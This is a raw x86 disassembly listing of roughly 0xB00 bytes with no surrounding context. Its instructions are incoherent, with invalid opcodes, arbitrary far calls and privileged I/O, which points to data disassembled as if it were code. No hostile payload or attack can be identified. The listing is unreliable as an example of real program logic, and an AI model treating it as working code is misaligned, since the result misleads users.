  4205e3:	imul   esi,ebp,0x16
  4205e6:	outs   dx,BYTE PTR ds:[esi]
  4205e7:	es dec ecx
  4205e9:	dec    edx
  4205ea:	leave  
  4205eb:	pop    ebx
  4205ec:	sub    eax,0x5b90b175
  4205f1:	mov    dh,0xb6
  4205f3:	popa   
  4205f4:	rcr    DWORD PTR [ebp+0x4c],cl
  4205f7:	and    al,0xd8
  4205f9:	test   al,0xfd
  4205fb:	and    DWORD PTR [ecx],0x831cdf4
  420601:	jge    0x420672
  420603:	jnp    0x4205ab
  420605:	push   esp
  420606:	call   0x70ff:0x940e33b1
  42060d:	and    DWORD PTR [edx-0x69dbb672],ebp
  420613:	jmp    0x56dc2c2c
  420618:	loope  0x4205dc
  42061a:	retf   0x6816
  42061d:	repz jno 0x420631
  420620:	cmp    eax,0xfd59f935
  420625:	push   edx
  420627:	rcl    BYTE PTR [edx],cl
  420629:	pop    edi
  42062a:	push   DWORD PTR [eax-0xb]
  42062d:	push   ss
  42062e:	call   0x18db:0x7b65c081
  420635:	in     al,dx
  420636:	and    ch,BYTE PTR [eax]
  420638:	jns    0x420623
  42063a:	adc    BYTE PTR [ecx+0x52],ah
  42063d:	pop    eax
  42063e:	repnz mov ah,0x8
	...
  4206b1:	add    BYTE PTR [eax],al
  4206b3:	add    BYTE PTR [edx-0x5081dcc4],dl
  4206b9:	jg     0x42069a
  4206bb:	cld    
  4206bc:	jo     0x4206a6
  4206be:	hlt    
  4206bf:	leave  
  4206c0:	jns    0x420709
  4206c2:	ret    
  4206c3:	mov    esp,0x15b43
  4206c8:	cmc    
  4206c9:	add    BYTE PTR [eax],al
  4206cb:	add    BYTE PTR [edi],ah
  4206cd:	(bad)  
  4206ce:	and    al,0x8e
  4206d0:	jp     0x420701
  4206d2:	imul   esp,esi,0x18358521
  4206d8:	icebp  
  4206d9:	pop    eax
  4206da:	sbb    bh,cl
  4206dc:	mov    esi,0xf084635
  4206e1:	inc    esp
  4206e2:	in     al,dx
  4206e3:	call   0xad2f:0xdea8e705
  4206ea:	mov    bl,0xc1
  4206ec:	imul   DWORD PTR [esi-0x24]
  4206ef:	mov    al,0x98
  4206f1:	mov    ah,dl
  4206f3:	dec    esp
  4206f4:	fistp  DWORD PTR [ebx]
  4206f6:	mov    DWORD PTR [edi],esp
  4206f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206f9:	push   esp
  4206fa:	sub    eax,0xc14c915
  4206ff:	div    BYTE PTR [esi-0x2a147831]
  420705:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  420707:	adc    dl,BYTE PTR [edi-0x78518367]
  42070d:	mov    ecx,eax
  42070f:	lods   al,BYTE PTR ds:[esi]
  420710:	loop   0x420699
  420712:	retf   0xac3a
  420715:	inc    eax
  420716:	and    esp,esp
  420718:	add    BYTE PTR [esi],al
  42071a:	gs add al,0x43
  42071d:	test   DWORD PTR [esi],ebp
  42071f:	in     al,0x80
  420721:	adc    DWORD PTR [ecx],0x70
  420724:	mov    ebx,0xb185103f
  420729:	sub    DWORD PTR [eax-0x17c877e6],eax
  42072f:	test   eax,0x6e6892a8
  420734:	imul   ecx,DWORD PTR ds:0x1a69fbe7,0x46d6c37b
  42073e:	sahf   
  42073f:	ja     0x4206da
  420741:	and    DWORD PTR [ebx+eiz*8-0x7e],ebp
  420745:	push   ecx
  420746:	xor    BYTE PTR [esi-0x72],al
  420749:	in     eax,0x99
  42074b:	pop    ss
  42074c:	or     ebx,ebx
  42074e:	arpl   WORD PTR [eax+0x20],bx
  420751:	adc    edx,DWORD PTR [ecx]
  420753:	fnsave [edi]
  420755:	nop
  420756:	cmp    al,0xba
  420758:	and    BYTE PTR [ecx-0x6f8ef1e3],cl
  42075e:	xchg   DWORD PTR [ebx+0x76],edi
  420761:	push   cs
  420762:	mov    edi,0xac18b07
  420767:	add    BYTE PTR [ecx+0x1ad3e0f0],ah
  42076d:	xor    edx,esi
  42076f:	inc    ecx
  420770:	cmp    eax,edx
  420772:	mov    cl,0xf0
  420774:	(bad)  
  420776:	and    DWORD PTR [ebx],ebp
  420778:	sub    al,0xe6
  42077a:	stos   BYTE PTR es:[edi],al
  42077b:	inc    ebp
  42077c:	cmc    
  42077d:	cmp    cl,bh
  42077f:	mov    ds:0x355ffc3f,al
  420784:	jo     0x4207a0
  420786:	cmp    esi,edx
  420788:	aaa    
  420789:	retf   
  42078a:	mov    esp,0xcdcb8458
  42078f:	fdiv   st,st(3)
  420791:	fwait
  420792:	inc    ebp
  420793:	jmp    0x420785
  420795:	(bad)  
  420796:	paddq  mm4,QWORD PTR [edx]
  420799:	sbb    al,BYTE PTR [ebp-0x486446a]
  42079f:	or     BYTE PTR [edi-0x3a],dl
  4207a2:	adc    BYTE PTR [esi+0x77],bh
  4207a5:	and    al,BYTE PTR [edi]
  4207a7:	mov    ecx,0x3e05e8db
  4207ac:	push   es
  4207ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207ae:	jne    0x420803
  4207b0:	push   esi
  4207b1:	push   eax
  4207b2:	fcomp  DWORD PTR [edx]
  4207b4:	ins    DWORD PTR es:[edi],dx
  4207b5:	rcr    edi,cl
  4207b7:	jge    0x4207ce
  4207b9:	dec    ecx
  4207ba:	sub    ebp,edx
  4207bc:	sbb    bl,BYTE PTR [ebp+0xce2c8]
	...
  420832:	add    BYTE PTR [eax],al
  420834:	mov    eax,ds:0x3b920b9a
  420839:	xchg   ebx,eax
  42083a:	mov    ecx,0xafa823bb
  42083f:	mov    bh,0x18
  420841:	pop    esi
  420842:	add    bh,BYTE PTR [ebx+0x38]
  420845:	pop    esp
  420846:	add    DWORD PTR [eax],eax
  420848:	cmc    
  420849:	add    BYTE PTR [eax],al
  42084b:	add    BYTE PTR [edx-0x51bce0eb],bl
  420851:	ja     0x42089c
  420853:	jl     0x4207f6
  420855:	test   DWORD PTR [ebp+0x5d],ebx
  420858:	rcl    DWORD PTR [ebx],cl
  42085a:	sub    BYTE PTR ds:0xa9c22642,bl
  420860:	fwait
  420861:	cwde   
  420862:	sub    ch,dh
  420864:	mov    cl,0x31
  420866:	mov    dh,bh
  420868:	xchg   esp,eax
  420869:	push   es
  42086a:	jb     0x4207fc
  42086c:	mov    BYTE PTR [eax+0x6],dl
  42086f:	frstor [edi]
  420871:	jg     0x42087c
  420873:	push   edx
  420874:	push   ds
  420875:	ja     0x420849
  420877:	cmp    al,0xd4
  420879:	pop    ds
  42087a:	jmp    0x5d53eb31
  42087f:	adc    eax,0x1233662d
  420884:	cmc    
  420885:	mov    WORD PTR [eax],es
  420887:	and    edx,DWORD PTR [esi-0x5cc0f3d4]
  42088d:	inc    ebx
  42088e:	pop    edx
  42088f:	scas   eax,DWORD PTR es:[edi]
  420890:	pop    ds
  420891:	jge    0x420820
  420893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420894:	stos   DWORD PTR es:[edi],eax
  420895:	mov    WORD PTR [eax],ds
  420897:	jg     0x4208a9
  420899:	push   ss
  42089a:	pop    edx
  42089b:	sbb    ah,BYTE PTR [ebp-0x36bb409f]
  4208a1:	xchg   BYTE PTR [esi-0x18],al
  4208a4:	mov    BYTE PTR [ebx+0x6bb57ec2],ah
  4208aa:	mov    ch,0xb4
  4208ac:	xor    eax,0xce1ab3ad
  4208b2:	jae    0x42091f
  4208b4:	in     al,0x78
  4208b6:	mov    BYTE PTR [ecx-0x65],0x5d
  4208ba:	std    
  4208bb:	stos   BYTE PTR es:[edi],al
  4208bc:	xchg   edi,eax
  4208bd:	xor    eax,0x9a9c8001
  4208c2:	rcr    DWORD PTR [esp+ebx*2+0x44c35750],1
  4208c9:	int    0xf5
  4208cb:	out    0xdd,al
  4208cd:	retf   
  4208ce:	outs   dx,BYTE PTR ds:[esi]
  4208cf:	cmp    esi,ebp
  4208d1:	mov    cl,0x9c
  4208d3:	fbstp  TBYTE PTR [edx+0x7d]
  4208d6:	adc    eax,0x8742a93a
  4208db:	ficom  WORD PTR [edx]
  4208dd:	bound  ecx,QWORD PTR [ecx+ebx*8]
  4208e0:	test   al,ah
  4208e2:	xchg   esp,eax
  4208e3:	cmp    edi,DWORD PTR [edi+eax*4-0x13011138]
  4208ea:	in     al,0x33
  4208ec:	xor    DWORD PTR [edx],0x7b766e11
  4208f2:	lahf   
  4208f3:	iret   
  4208f4:	bound  esi,QWORD PTR [ebp+0x2b]
  4208f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208f8:	mov    cl,0x2f
  4208fa:	ins    BYTE PTR es:[edi],dx
  4208fb:	cwde   
  4208fc:	jl     0x420898
  4208fe:	nop
  4208ff:	popf   
  420900:	sub    edx,DWORD PTR [eax-0x54]
  420903:	or     BYTE PTR [ecx],0x80
  420906:	inc    DWORD PTR [ebx+0x22]
  420909:	call   0x27e6c160
  42090e:	shr    DWORD PTR [ebx+ecx*1],1
  420911:	lea    ebx,[eax]
  420913:	nop
  420914:	stos   BYTE PTR es:[edi],al
  420915:	push   ds
  420916:	add    bh,cl
  420918:	and    eax,0xdcc5ae6f
  42091d:	xor    al,0x99
  42091f:	xor    eax,0x4c310a11
  420924:	out    dx,eax
  420925:	pop    edx
  420926:	push   0x27
  420928:	fcmovu st,st(4)
  42092a:	xchg   ebp,eax
  42092b:	das    
  42092c:	inc    eax
  42092d:	sub    al,0xdb
  42092f:	(bad)  
  420930:	(bad)  
  420931:	pop    ds
  420932:	sub    BYTE PTR [ebx-0x949e33b],0x32
  420939:	or     edx,DWORD PTR [ebx-0x3ed9f25e]
  42093f:	call   0x0:0x62
	...
  4209b2:	add    BYTE PTR [eax],al
  4209b4:	or     al,BYTE PTR [ecx-0x49]
  4209b7:	mov    eax,ds:0xeb1ef7ff
  4209bc:	rcr    BYTE PTR [esi+0x46d966de],0x8
  4209c3:	inc    edi
  4209c4:	sub    eax,0xf500015d
  4209c9:	add    BYTE PTR [eax],al
  4209cb:	add    BYTE PTR [eax+0xd],bl
  4209ce:	fs dec esi
  4209d0:	(bad)  
  4209d2:	fisttp WORD PTR [ecx-0x4a]
  4209d5:	push   cs
  4209d6:	shl    al,1
  4209d8:	sub    al,BYTE PTR es:[edi+0x66859403]
  4209df:	add    ah,BYTE PTR [esi+0x1d5b69f8]
  4209e5:	aam    0x29
  4209e7:	or     dl,BYTE PTR [edi+0x244b119d]
  4209ed:	mov    dh,0x1b
  4209ef:	idiv   BYTE PTR [eax+ecx*2-0x2d]
  4209f3:	pusha  
  4209f4:	imul   edi,DWORD PTR [ecx*2-0x5bef4708],0x63
  4209fc:	push   ecx
  4209fd:	(bad)  
  4209fe:	fdivr  QWORD PTR [eax]
  420a00:	call   bp
  420a03:	push   esi
  420a04:	jl     0x4209b2
  420a06:	ss js  0x420a3f
  420a09:	add    DWORD PTR [esi-0x10],esi
  420a0c:	and    esp,DWORD PTR [ecx+0x6ef289e1]
  420a12:	pop    edi
  420a13:	and    al,0xf5
  420a15:	sti    
  420a16:	jle    0x4209d6
  420a18:	mov    eax,ds:0xa6057ad2
  420a1d:	outs   dx,BYTE PTR ds:[esi]
  420a1e:	retf   
  420a1f:	gs iret 
  420a21:	sub    eax,0x7c361a31
  420a26:	xchg   ebp,eax
  420a27:	jb     0x4209ac
  420a29:	mov    cl,BYTE PTR [eax+ebp*1]
  420a2c:	mov    cl,0xc3
  420a2e:	mov    esp,0xe5ce14f4
  420a33:	xor    BYTE PTR [esi],dl
  420a35:	sti    
  420a36:	mov    al,ds:0xdcc88d38
  420a3b:	fwait
  420a3c:	sub    DWORD PTR [edx],esi
  420a3e:	jns    0x4209e4
  420a40:	inc    ecx
  420a41:	(bad)  
  420a42:	arpl   WORD PTR [ecx-0x71],dx
  420a45:	xor    ah,BYTE PTR [ebx*1-0x712575d]
  420a4c:	lods   al,BYTE PTR ds:[esi]
  420a4d:	sub    BYTE PTR [eax-0x54390354],0xf
  420a54:	or     dl,dh
  420a56:	(bad)  
  420a57:	jb     0x420a94
  420a59:	retf   
  420a5a:	ss and al,0x3a
  420a5d:	dec    eax
  420a5e:	dec    ecx
  420a5f:	ins    BYTE PTR es:[edi],dx
  420a60:	sub    DWORD PTR [ecx+ebp*1-0x7a7ec35a],edx
  420a67:	ins    BYTE PTR es:[edi],dx
  420a68:	idiv   DWORD PTR [ecx+0x59]
  420a6b:	outs   dx,BYTE PTR ds:[esi]
  420a6c:	out    dx,al
  420a6d:	or     ecx,DWORD PTR [ebp+eax*4+0x69]
  420a71:	outs   dx,DWORD PTR ds:[esi]
  420a72:	not    BYTE PTR [edi+edi*8-0x43]
  420a76:	xchg   edx,eax
  420a77:	aad    0x98
  420a79:	loop   0x420aef
  420a7b:	pop    ss
  420a7c:	cmp    eax,0x8e0bc357
  420a81:	fistp  WORD PTR [ecx-0x5a5a450a]
  420a87:	(bad)  
  420a88:	fbstp  TBYTE PTR ds:[edi+0x53]
  420a8c:	push   es
  420a8d:	not    DWORD PTR [ebx-0x30ea688e]
  420a93:	imul   esi,DWORD PTR [edx-0x52],0xffffff9a
  420a97:	pop    es
  420a98:	lods   eax,DWORD PTR ds:[esi]
  420a99:	and    DWORD PTR [ebx+0x3694cd78],esp
  420a9f:	fist   WORD PTR [esi]
  420aa1:	(bad)  
  420aa2:	mov    cl,0x8a
  420aa4:	jo     0x420a2b
  420aa6:	dec    ecx
  420aa7:	fist   WORD PTR [eax]
  420aa9:	in     al,dx
  420aaa:	push   eax
  420aab:	loopne 0x420b2c
  420aad:	popa   
  420aae:	not    BYTE PTR [edi+0x52]
  420ab1:	push   ebp
  420ab2:	dec    esp
  420ab3:	sbb    ah,dh
  420ab5:	(bad)  
  420ab6:	pop    ebp
  420ab7:	mov    edx,0xc009eeb6
  420abc:	enter  0x4aa5,0x2f
  420ac0:	push   edi
	...
  420b31:	add    BYTE PTR [eax],al
  420b33:	add    ah,bl
  420b35:	sub    BYTE PTR [edx-0x119011c],cl
  420b3b:	cmp    BYTE PTR [edi+0x39],dl
  420b3e:	dec    edx
  420b3f:	(bad)  
  420b41:	push   ebx
  420b42:	lock stos DWORD PTR es:[edi],eax
  420b44:	and    bl,BYTE PTR [esi+0x1]
  420b47:	add    ch,dh
  420b49:	add    BYTE PTR [eax],al
  420b4b:	add    BYTE PTR [ebx],dl
  420b4d:	lea    esp,[ecx-0x63f003cf]
  420b53:	std    
  420b54:	aam    0x55
  420b56:	imul   esp,DWORD PTR [ebx],0xffffffb4
  420b59:	out    dx,al
  420b5a:	cwde   
  420b5b:	mov    edx,0xc4ce2522
  420b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b61:	je     0x420af9
  420b63:	mov    al,ds:0xf7555887
  420b68:	and    DWORD PTR [edi+ebp*8-0x3b],ebx
  420b6c:	dec    edi
  420b6d:	pop    esi
  420b6e:	jne    0x420b0e
  420b70:	ins    BYTE PTR es:[edi],dx
  420b71:	and    bh,BYTE PTR [edx+0x1adead29]
  420b77:	and    al,BYTE PTR [edi-0x71]
  420b7a:	test   DWORD PTR [ecx],esp
  420b7c:	mov    ebx,0xac187866
  420b81:	ret    0xc8a9
  420b84:	int    0xba
  420b86:	or     DWORD PTR [edx+0x473ec726],0x6c
  420b8d:	imul   esp,DWORD PTR [eax-0x1933c17d],0x7
  420b94:	ins    BYTE PTR es:[edi],dx
  420b95:	pusha  
  420b96:	ret    
  420b97:	out    0x3f,eax
  420b99:	xchg   BYTE PTR [edi+0xd97cba2],ah
  420b9f:	adc    ebp,DWORD PTR [esi-0x54]
  420ba2:	in     al,dx
  420ba3:	sahf   
  420ba4:	mov    eax,ds:0x76200436
  420ba9:	lods   eax,DWORD PTR ds:[esi]
  420baa:	mov    al,0xba
  420bac:	test   DWORD PTR [edx+eax*4+0x2],esp
  420bb0:	dec    edi
  420bb1:	cld    
  420bb2:	test   al,0x48
  420bb4:	xchg   edi,eax
  420bb5:	push   edi
  420bb6:	ss stos BYTE PTR es:[edi],al
  420bb8:	ins    BYTE PTR es:[edi],dx
  420bb9:	mul    DWORD PTR [edi]
  420bbb:	pop    ecx
  420bbc:	push   edi
  420bbd:	daa    
  420bbe:	mov    ?,WORD PTR [edi]
  420bc0:	mov    bh,0x12
  420bc2:	sahf   
  420bc3:	xchg   esp,eax
  420bc4:	xor    al,BYTE PTR [esi-0x4b0abf21]
  420bca:	into   
  420bcb:	sub    eax,esp
  420bcd:	clc    
  420bce:	scas   eax,DWORD PTR es:[edi]
  420bcf:	push   cs
  420bd0:	ds adc eax,0x38e5ac0
  420bd6:	push   ss
  420bd7:	push   ss
  420bd8:	stos   BYTE PTR es:[edi],al
  420bd9:	jo     0x420c4e
  420bdb:	sar    BYTE PTR [edx],1
  420bdd:	xchg   BYTE PTR [esp+eax*1],cl
  420be0:	add    DWORD PTR [ebx+0x43],0x7bb8e87d
  420be7:	sbb    esp,DWORD PTR [edi]
  420be9:	repnz and dl,BYTE PTR [esi+0x56a287c9]
  420bf0:	addr16 iret 
  420bf2:	jnp    0x420b84
  420bf4:	jg     0x420bcc
  420bf6:	ins    DWORD PTR es:[edi],dx
  420bf7:	xor    eax,0x33e69f3d
  420bfc:	or     BYTE PTR [edx+0x615ab35d],dl
  420c02:	cmc    
  420c03:	and    esi,ebx
  420c05:	fs addr16 (bad) 
  420c08:	lods   eax,DWORD PTR ds:[esi]
  420c09:	out    dx,al
  420c0a:	and    eax,0x7a4d13bc
  420c0f:	mov    dh,0x5
  420c11:	sahf   
  420c12:	cmp    dl,BYTE PTR [edx+0x74e30182]
  420c18:	mov    ebp,0xef079de
  420c1d:	inc    edx
  420c1e:	or     eax,0x25a7bf58
  420c23:	aad    0xa0
  420c25:	nop
  420c26:	test   al,0x5
  420c28:	js     0x420ca9
  420c2a:	js     0x420c71
  420c2c:	fistp  QWORD PTR [ebx-0x523de396]
  420c32:	rol    BYTE PTR [edi-0x25],1
  420c35:	jne    0x420ca0
  420c37:	mov    ds:0xdb83598e,eax
  420c3c:	retf   0xba7a
  420c3f:	xlat   BYTE PTR ds:[ebx]
  420c40:	add    al,0x0
	...
  420cb2:	add    BYTE PTR [eax],al
  420cb4:	or     al,0x6a
  420cb6:	push   edx
  420cb7:	shl    DWORD PTR [esi-0x7],0x9f
  420cbb:	out    dx,eax
  420cbc:	xchg   ecx,eax
  420cbd:	inc    ecx
  420cbe:	push   0x1873845f
  420cc3:	(bad)  
  420cc4:	pop    ss
  420cc5:	pop    edi
  420cc6:	add    DWORD PTR [eax],eax
  420cc8:	cmc    
  420cc9:	add    BYTE PTR [eax],al
  420ccb:	add    BYTE PTR [edi+0x5b],cl
  420cce:	inc    ebp
  420ccf:	mov    ss,WORD PTR [eax]
  420cd1:	das    
  420cd2:	sbb    ebx,0x87f0e6c2
  420cd8:	int    0xb2
  420cda:	cmp    DWORD PTR [ecx+0x59],ebp
  420cdd:	adc    cl,BYTE PTR [edx-0x69798b7]
  420ce3:	mov    esp,0x20344d76
  420ce8:	mov    es,edi
  420cea:	mov    dh,0x73
  420cec:	mov    bh,0x89
  420cee:	test   BYTE PTR [esi+edi*2],cl
  420cf1:	sbb    BYTE PTR [eax+0x5985b566],dl
  420cf7:	mov    eax,0xdc201430
  420cfc:	clc    
  420cfd:	ins    DWORD PTR es:[edi],dx
  420cfe:	xchg   bh,cl
  420d00:	les    ecx,FWORD PTR [edi+eax*1+0x31]
  420d04:	and    eax,DWORD PTR [esi-0x42]
  420d07:	jmp    0x7e97:0x951e6e7b
  420d0e:	jecxz  0x420d76
  420d10:	scas   eax,DWORD PTR es:[edi]
  420d11:	adc    al,BYTE PTR [esi-0x7d79fb1a]
  420d17:	push   es
  420d18:	outs   dx,DWORD PTR ds:[esi]
  420d19:	dec    eax
  420d1a:	lods   eax,DWORD PTR ds:[esi]
  420d1b:	mov    ecx,0x5f2d61a0
  420d20:	or     ebp,ebx
  420d22:	lock and BYTE PTR [eax+0x2e],0xd2
  420d27:	into   
  420d28:	popa   
  420d29:	jle    0x420caf
  420d2b:	gs push ebx
  420d2d:	fst    DWORD PTR [edx]
  420d2f:	mov    al,0x66
  420d31:	test   eax,0xaf053b9f
  420d36:	daa    
  420d37:	mov    ecx,0x77be1ec7
  420d3c:	dec    esi
  420d3d:	cmp    BYTE PTR [ebx],bl
  420d3f:	pop    edx
  420d40:	pop    edi
  420d41:	push   ss
  420d42:	xor    ah,BYTE PTR [esi+0x23580a06]
  420d48:	aaa    
  420d49:	cs jo  0x420d30
  420d4c:	shr    BYTE PTR [esi-0x4b534382],0x3a
  420d53:	sbb    eax,0xf2047be
  420d58:	call   0x38bb:0x148e6dbd
  420d5f:	xor    BYTE PTR [ecx],ah
  420d61:	xchg   DWORD PTR [esi-0x251b3c68],edx
  420d67:	mov    esp,ebx
  420d69:	lahf   
  420d6a:	and    al,0x41
  420d6c:	xchg   dl,ah
  420d6e:	dec    ebp
  420d6f:	jge    0x420d57
  420d71:	ret    0x2638
  420d74:	int    0xa1
  420d76:	sub    al,0x29
  420d78:	test   DWORD PTR [esp+ebx*2-0x3a],0x1ec659b7
  420d80:	lock or eax,0x3036d57d
  420d86:	in     al,dx
  420d87:	push   esp
  420d88:	ja     0x420d62
  420d8a:	mov    bl,0xc2
  420d8c:	jp     0x420dc7
  420d8e:	push   ds
  420d8f:	mov    edi,0x8ebdf3ed
  420d94:	lods   al,BYTE PTR es:[esi]
  420d96:	into   
  420d97:	call   0xbad3065a
  420d9c:	xchg   edi,eax
  420d9d:	xchg   edx,eax
  420d9e:	scas   al,BYTE PTR es:[edi]
  420d9f:	(bad)  
  420da0:	dec    edx
  420da1:	sub    eax,0x8d06ea39
  420da6:	das    
  420da7:	pop    esp
  420da8:	jp     0x420daf
  420daa:	bound  esp,QWORD PTR [ecx-0x5f2ae905]
  420db0:	pop    esp
  420db1:	fsubr  QWORD PTR [eax]
  420db3:	fsub   QWORD PTR fs:[ebp+eax*1-0x6d50a999]
  420dbb:	mov    ah,0xf5
  420dbd:	and    eax,0xe1710b
	...
  420e32:	add    BYTE PTR [eax],al
  420e34:	stos   BYTE PTR es:[edi],al
  420e35:	push   ebp
  420e36:	call   0x645d:0xffefffe7
  420e3d:	inc    ebx
  420e3e:	and    edx,ecx
  420e40:	fwait
  420e41:	and    BYTE PTR [ebx],0x30
  420e44:	or     al,0x60
  420e46:	add    DWORD PTR [eax],eax
  420e48:	cmc    
  420e49:	add    BYTE PTR [eax],al
  420e4b:	add    bh,bh
  420e4d:	ja     0x420e3c
  420e4f:	aam    0xb1
  420e51:	jbe    0x420e4d
  420e53:	iret   
  420e54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e55:	repz jns 0x420ec5
  420e58:	sub    ah,BYTE PTR [ebp-0x55]
  420e5b:	pop    esi
  420e5c:	mov    bl,0x10
  420e5e:	dec    esp
  420e5f:	pop    esi
  420e60:	push   edx
  420e61:	ffree  st(5)
  420e63:	fstp   DWORD PTR [esi+eax*4+0x624abb00]
  420e6a:	mov    bl,0x94
  420e6c:	push   edi
  420e6d:	cmp    bl,0xb6
  420e70:	pop    ecx
  420e71:	ja     0x420ea7
  420e73:	fist   DWORD PTR [esi]
  420e75:	fisub  DWORD PTR [ebx-0x1b0d1ef]
  420e7b:	mov    dl,0x3e
  420e7d:	sub    eax,0x3a033214
  420e82:	adc    si,WORD PTR [ebx+esi*1]
  420e86:	inc    edx
  420e87:	sub    eax,0xfcc89612
  420e8c:	and    esp,DWORD PTR [esi-0x2f00c1aa]
  420e92:	sar    DWORD PTR [edi],0xa8
  420e95:	neg    esi
  420e97:	je     0x420e3d
  420e99:	sub    eax,esp
  420e9b:	out    dx,al
  420e9c:	fisubr DWORD PTR [ebp+0x35d69c96]
  420ea2:	push   esp
  420ea3:	push   0xe7d1f420
  420ea8:	xor    ax,0xf2ec
  420eac:	jg     0x420ef6
  420eae:	call   0x1451dff9
  420eb3:	sub    ch,dl
  420eb5:	imul   edx,DWORD PTR [ecx+0x30b3eca1],0x58992a13
  420ebf:	sar    DWORD PTR [esi],1
  420ec1:	(bad)  
  420ec3:	call   0xf8083d0f
  420ec8:	leave  
  420ec9:	sub    eax,0x201f24a0
  420ece:	xchg   edx,eax
  420ecf:	or     ecx,DWORD PTR [edx+0x57]
  420ed2:	in     eax,0xc0
  420ed4:	mov    al,ds:0x19c83867
  420ed9:	data16 in al,0xc7
  420edc:	jle    0x420e78
  420ede:	sub    eax,0xf41ea5d
  420ee3:	in     eax,0x57
  420ee5:	xor    eax,0x82d03c7e
  420eea:	jecxz  0x420ed1
  420eec:	dec    ebx
  420eed:	or     ebp,DWORD PTR [eax]
  420eef:	xor    eax,DWORD PTR [edx-0x4dbdc4d3]
  420ef5:	std    
  420ef6:	jno    0x420eca
  420ef8:	inc    ebx
  420ef9:	rol    DWORD PTR [ebx-0x48],1
  420efc:	sti    
  420efd:	jnp    0x420f6e
  420eff:	(bad)  [edx-0x2a]
  420f02:	lahf   
  420f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f04:	in     eax,dx
  420f05:	add    BYTE PTR [esi+0x35c2adc8],bl
  420f0b:	ins    DWORD PTR es:[edi],dx
  420f0c:	cli    
  420f0d:	sub    ah,BYTE PTR [ecx]
  420f0f:	mov    ch,0x4c
  420f11:	mov    dl,0xa3
  420f13:	jg     0x420ec7
  420f15:	jbe    0x420f4b
  420f17:	shl    BYTE PTR [ebx+eax*8],0x1a
  420f1b:	imul   DWORD PTR [ebx+ebx*2-0x70]
  420f1f:	mov    esp,0xc24f7728
  420f24:	mov    esp,0x9e33568c
  420f29:	jl     0x420f49
  420f2b:	pop    edi
  420f2c:	stc    
  420f2d:	les    edx,FWORD PTR [ebx+0x4cd94068]
  420f33:	push   ecx
  420f34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f35:	push   esi
  420f36:	lea    edx,[eax+eax*2-0x1e]
  420f3a:	ins    BYTE PTR es:[edi],dx
  420f3b:	mov    bh,0x1e
  420f3d:	mov    al,BYTE PTR ds:0xc92e
	...
  420fb3:	add    BYTE PTR [edx-0x5b],ah
  420fb6:	jbe    0x421037
  420fb8:	idiv   edi
  420fba:	imul   edi,DWORD PTR [ebp-0x6d53d0f4],0x27
  420fc1:	or     al,0xdb
  420fc3:	mov    ecx,0x16101
  420fc8:	cmc    
  420fc9:	add    BYTE PTR [eax],al
  420fcb:	add    dh,al
  420fcd:	xchg   esp,eax
  420fce:	inc    edi
  420fcf:	xchg   ebp,eax
  420fd0:	lods   eax,DWORD PTR ds:[esi]
  420fd1:	arpl   si,cx
  420fd3:	lea    ebp,[edx+0x7e21c7aa]
  420fd9:	mov    ch,0x90
  420fdb:	int3   
  420fdc:	popa   
  420fdd:	cmp    DWORD PTR [esi],0xbac6860b
  420fe3:	pop    esi
  420fe4:	push   ds
  420fe5:	shr    DWORD PTR [ecx],cl
  420fe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fe8:	cmp    al,0xd6
  420fea:	dec    esp
  420feb:	shl    edi,0x76
  420fee:	dec    ebx
  420fef:	inc    edi
  420ff0:	mov    eax,0x20e3c576
  420ff5:	push   ss
  420ff6:	out    dx,eax
  420ff7:	shl    ch,cl
  420ff9:	sub    ebp,DWORD PTR [edi+0x15]
  420ffc:	sub    DWORD PTR [edi+ebp*2+0x74c0fd2e],edi
  421003:	and    al,0x66
  421005:	adc    al,al
  421007:	cs and al,0xef
  42100a:	or     ecx,ecx
  42100c:	ds or  al,0xde
  42100f:	lods   al,BYTE PTR ds:[esi]
  421010:	mov    cl,0xf3
  421012:	rcl    BYTE PTR [ebx+ebx*8+0x17f28e2],0x6e
  42101a:	mov    ecx,0xe2bfa62
  42101f:	not    BYTE PTR [ebx]
  421021:	pop    es
  421022:	mov    cs,WORD PTR [ebp+esi*2-0x361ee779]
  421029:	add    eax,0x5878d0c0
  42102e:	xchg   esp,eax
  42102f:	and    eax,0x5df6d9e9
  421034:	mov    dl,0xb4
  421036:	das    
  421037:	mov    dh,0xc0
  421039:	jns    0x421083
  42103b:	ins    BYTE PTR es:[edi],dx
  42103c:	mov    al,0x16
  42103e:	sbb    BYTE PTR [edx-0x157f29ce],dh
  421044:	adc    DWORD PTR [ecx-0x15571940],esp
  42104a:	icebp  
  42104b:	sbb    eax,0x8475ef4
  421050:	sbb    BYTE PTR [ebp-0x2e],ch
  421053:	iret   
  421054:	xchg   edx,eax
  421055:	lahf   
  421056:	test   DWORD PTR [edx+edi*4-0x5b],edi
  42105a:	call   DWORD PTR [esi+ecx*8-0x6f1fedba]
  421061:	adc    al,0xb3
  421063:	ins    BYTE PTR es:[edi],dx
  421064:	and    eax,0x65acec8f
  421069:	popf   
  42106a:	jl     0x4210c9
  42106c:	fcmovnbe st,st(2)
  42106e:	cmp    al,0x89
  421070:	mov    ah,0x17
  421072:	add    bh,BYTE PTR [ecx]
  421074:	int    0x1
  421076:	shl    BYTE PTR [edx-0x15a60893],0x85
  42107d:	adc    BYTE PTR [ebx-0x15],ch
  421080:	adc    edx,DWORD PTR [eax-0x5f]
  421083:	sub    al,0x3d
  421085:	mov    ebx,0x491449a5
  42108a:	(bad)  
  42108c:	(bad)  
  42108e:	push   cs
  42108f:	cmp    al,0x44
  421091:	sahf   
  421092:	and    DWORD PTR [esi-0x11],eax
  421095:	mov    esp,0x1212a282
  42109a:	fwait
  42109b:	inc    ecx
  42109c:	iret   
  42109d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42109e:	inc    edi
  42109f:	xor    DWORD PTR [ebx+0x11afae0a],ebx
  4210a5:	jnp    0x42102c
  4210a7:	and    al,0x69
  4210a9:	add    bh,BYTE PTR [ecx-0x37891ac1]
  4210af:	imul   ebx,DWORD PTR [ebx],0xffffff94
  4210b2:	(bad)  
